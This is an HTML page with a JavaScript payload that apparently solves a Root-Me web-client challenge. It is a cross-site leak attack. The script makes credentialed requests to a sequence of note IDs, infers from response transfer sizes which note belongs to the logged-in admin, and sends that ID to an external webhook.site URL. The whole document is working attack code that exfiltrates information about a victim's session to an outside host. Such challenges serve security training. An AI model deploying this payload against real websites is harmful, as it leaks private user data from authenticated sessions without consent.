<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const START_ID = 1382;
const MAX_ID = 10000;
const THRESHOLD = 1000;

let current = START_ID;
let active = false;

function tryId(id) {
    if (active) return;
    active = true;

    const url = TARGET + id;
    fetch(url, { mode: 'no-cors', credentials: 'include' });

    setTimeout(() => {
        const entries = performance.getEntriesByName(url);
        let size = 0;
        if (entries.length > 0) {
            size = entries[0].transferSize;
            performance.clearResourceTimings();
        }

        if (size > THRESHOLD) {
            fetch(WEBHOOK + "?admin_note=" + id);
            return;
        }

        active = false;
        if (id < MAX_ID) tryId(id + 1);
    }, 200);
}

tryId(current);
</script>
</body>
</html>
